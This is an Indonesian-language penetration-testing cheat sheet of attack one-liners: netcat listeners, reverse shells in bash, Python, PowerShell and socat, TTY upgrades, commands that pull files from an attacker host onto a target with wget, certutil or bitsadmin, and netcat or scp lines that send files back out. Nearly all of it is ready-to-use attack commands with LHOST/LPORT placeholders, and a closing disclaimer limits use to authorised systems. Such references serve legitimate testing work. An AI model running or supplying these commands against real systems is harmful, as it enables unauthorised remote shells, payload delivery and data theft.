# CHEATSHEETS — Oneliner yang Dipakai Terus

> Reverse shell, file transfer, upgrade shell, encoding. Set `LHOST`/`LPORT` dulu. Untuk engagement sah.

## Daftar Isi
1. [Listener](#listener)
2. [Reverse shells](#revshell)
3. [Upgrade TTY](#tty)
4. [File transfer](#transfer)
5. [Encoding / decoding](#encoding)
6. [Serve files cepat](#serve)

---

<a name="listener"></a>
## 1. Listener (di attacker)
```bash
nc -lvnp 4444                      # netcat
rlwrap nc -lvnp 4444               # + history/arrow keys (recommended)
# metasploit multi/handler untuk payload staged
# pwncat-cs -lp 4444               # listener pintar (auto-upgrade tty)
```

<a name="revshell"></a>
## 2. Reverse Shells (di target) — set LHOST LPORT
```bash
# Bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
# sh
sh -i >& /dev/tcp/LHOST/LPORT 0>&1
# Python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
# nc (tanpa -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
# PowerShell (Windows) — one line
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sy=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);$s.Flush()}"
# PHP / Perl / Ruby / Java / socat juga ada → generator: revshells.com
socat TCP:LHOST:LPORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane   # socat full-tty
```

<a name="tty"></a>
## 3. Upgrade ke Full TTY (setelah dapat shell mentah)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'     # atau python / script -qc /bin/bash /dev/null
# lalu:  Ctrl+Z
stty raw -echo; fg                                  # (di attacker) lalu Enter 2x
export TERM=xterm; stty rows 50 columns 200         # sesuaikan ukuran
```

<a name="transfer"></a>
## 4. File Transfer
```bash
# --- Linux target menarik file dari attacker (attacker serve dulu, lihat §6) ---
wget http://LHOST:8000/file -O /tmp/file
curl http://LHOST:8000/file -o /tmp/file
# --- Windows target ---
certutil -urlcache -f http://LHOST:8000/file.exe file.exe
powershell iwr http://LHOST:8000/file.exe -o file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST:8000/f.exe','f.exe')"
bitsadmin /transfer j http://LHOST:8000/f.exe C:\f.exe
# --- Upload dari target → attacker ---
# attacker:  nc -lvnp 9001 > loot.file        target: nc LHOST 9001 < file
scp file user@LHOST:/path                     # kalau SSH tersedia
# base64 kecil via clipboard: base64 -w0 file  → paste → base64 -d > file
```

<a name="encoding"></a>
## 5. Encoding / Decoding
```bash
echo -n 'text' | base64                 # encode
echo 'dGV4dA==' | base64 -d             # decode
echo -n 'text' | xxd -p                 # hex
python3 -c 'import urllib.parse;print(urllib.parse.quote("a b&c"))'   # URL-encode
echo -n 'text' | md5sum ; sha1sum ; sha256sum
# hash identify: nth -t '<hash>'  (name-that-hash)
# CyberChef (gchq.github.io/CyberChef) untuk chain kompleks
```

<a name="serve"></a>
## 6. Serve Files Cepat (di attacker)
```bash
python3 -m http.server 8000                 # HTTP dir listing
python3 -m http.server 8000 --bind 0.0.0.0
php -S 0.0.0.0:8000                          # alternatif
# Upload server (target bisa POST file balik):
python3 -m uploadserver 8000                 # pip install uploadserver
# SMB server (bagus untuk Windows target):
impacket-smbserver share . -smb2support      # target: copy \\LHOST\share\file .
# FTP cepat:
python3 -m pyftpdlib -p 21 -w                # writable
```

---
> Semua di sini standar & publik (revshells.com, HackTricks, PayloadsAllTheThings). Gunakan hanya pada
> sistem yang kamu punya izin uji.
